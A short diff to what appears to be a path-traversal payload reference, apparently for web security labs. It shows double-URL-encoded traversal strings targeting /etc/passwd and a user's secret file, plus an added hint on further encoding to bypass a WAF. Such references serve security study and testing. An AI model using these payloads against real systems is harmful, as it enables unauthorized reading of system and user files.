@@ -41,7 +41,7 @@
 ### Double URL Encoding
 ```
 ..%252f..%252f..%252fetc%252fpasswd
-..%252f..%252f..%252fhome%252fcarlos%252fsecret
+..%252f..%252f..%252fhome%252fcarlos%252fsecret   (in case of waf blocking, encode chars too)
 ```
 
 ### Full Path Encoding (WAF Bypass)
